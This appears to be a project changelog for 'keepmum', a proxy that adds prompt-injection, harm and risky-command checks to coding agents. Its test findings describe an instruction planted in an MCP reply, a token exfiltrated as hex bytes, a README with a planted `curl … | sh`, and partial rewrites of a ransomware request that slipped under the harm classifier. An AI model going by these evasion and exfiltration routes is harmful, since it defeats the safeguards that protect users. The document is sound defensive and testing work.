- [x] **Optional checks (Nov 4–5, 2026).** Off by default, each warn or block: prompt injection in tool results (`guard.py`, Prompt Injection Guard Small, since Nov 13 keepmum's fine-tune of it on coding-agent tool output, as a GGUF keepmum hosts; `bench/results/GUARD.md`), harmful requests in what the user typed (`harm.py`, Content Safety Guard Small, or Qwen3Guard-Gen 0.6B or 4B; `bench/results/HARM.md`), both in llama-server on Metal and downloaded only by `keepmum guard setup` (or, for an injection model from an earlier version while the check is on, by the service when it starts); and risky shell commands in the model's replies (`commands.py`, seven rules, no model). Local mode (injection and harm) answers a flagged request with a model on this Mac (`local.py`; Ollama, LM Studio, llama.cpp, or Chat Completions for others), tried in order, never sent to the provider. Hits are logged, counted and audited with the check, score and length, never the text; the Mac app shows them in the flow diagram, Activity and Logs. The README has the details.
- [x] **Local mode, further (Nov 9–10, 2026).** Skills for local turns (`[guard] local_skills`: SKILL.md files the local model gets after keepmum's note, read on every turn). Handing back to the cloud after an injection hit (`handback.py`, `[guard] local_handback`): stay, or replace the flagged result with the local model's answer, summary or rewrite (keepmum's instruction or the user's) or a notice; what the local model writes is checked on its own before it goes, and keepmum's own wording around it is not scored (it reads like an injection to the model, 0.99). Gemini's API (the Antigravity CLI, Gemini CLI) goes local as Chat Completions, its answer back as a GenerateContentResponse, plain or wrapped for Code Assist, streamed or whole. Verified with real agents (`e2e/cases/local-*`): Claude Code, Codex and agy, scripted and live, with the real injection model and Ollama; the runs found that keepmum's wording was flagged and that Codex's `additional_tools` input item made Ollama refuse the request.
- [x] **The harm check hands back (Nov 13, 2026).** `[guard] local_handback_harm = "rewrite"`: the local model takes the part the harm check flagged out of what the user typed and keeps the rest; that replaces the typed part inside its message (what the agent added stays) and the turn goes to the cloud. Removal only: the instruction forbids rewording or disguising, and the harm check reads what was written; still flagged, or nothing left, keeps the turn local and is not asked again. Default `stay`, as before. **End-to-end (Nov 14, 2026):** with the real harm model and a 35B local model, the first instruction handed back 10 of 18 rewrites, often by cutting only the end of a harmful sentence, and one such cut ("…ransomware that encrypts every file on [removed by keepmum]") scored under the threshold as a whole. Now the instruction asks for each request taken out whole, with an example; the `<message>` wrapper a model copies is stripped; a rewrite whose kept pieces are not in what was typed, word for word and in order, stays local; and the harm check reads each sentence on its own as well as the whole. 16 of 18 handed back, no partial request passed. e2e cases `harm-01` (block), `harm-02` (stay local), `harm-03` (rewrite to the cloud) run on Claude Code, Codex and agy.
- [x] **Real-agent end-to-end, live (Nov 14, 2026).** The e2e suite gained cases for the harm check (block, local, rewrite), the commands check (block in each agent's tool shape, warn), the injection check's warn and block modes, an instruction planted in an MCP reply, a piece of a withheld result asked for again, both checks on Local together, and a local server that is down; the harm and local cases now run on pi and opencode too. `python -m e2e run -j N` runs in worker processes (85 scripted runs: 18 s, from about 100), with runs that use a model one at a time and, live, each agent once at a time; a failed run always keeps its requests. Live on API keys (gpt-6-luna, Claude Haiku 5.5) it found: a token leaving as hex bytes after a label (`bytes: 47 49 …`, from a script the model wrote; opencode's `HEX: …`), now decoded; a model refused a README printing only its backtick commands, the planted `curl … | sh` among them, now flagged as a piece of the flagged result; and every agent retrying keepmum's 502 when the local server is down (Claude Code and agy past two minutes), now a 403. A known gap stays: a Codex script can pass a value it read to an MCP tool without the model seeing it (`mcp-03`); keepmum warns.
